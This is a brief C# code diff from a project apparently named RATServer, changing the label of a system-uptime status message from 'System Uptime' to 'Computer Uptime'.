@@ -327,7 +327,7 @@ namespace RATServer
             try
             {
                 TimeSpan uptime = TimeSpan.FromMilliseconds(Environment.TickCount);
-                r.Msg = $"System Uptime: {uptime.Days} Days, {uptime.Hours} Hours, {uptime.Minutes} Minutes, {uptime.Seconds} Seconds";
+                r.Msg = $"Computer Uptime: {uptime.Days} Days, {uptime.Hours} Hours, {uptime.Minutes} Minutes, {uptime.Seconds} Seconds";
             }
             catch (Exception e) { r.Msg = e.Message; }
             return r;
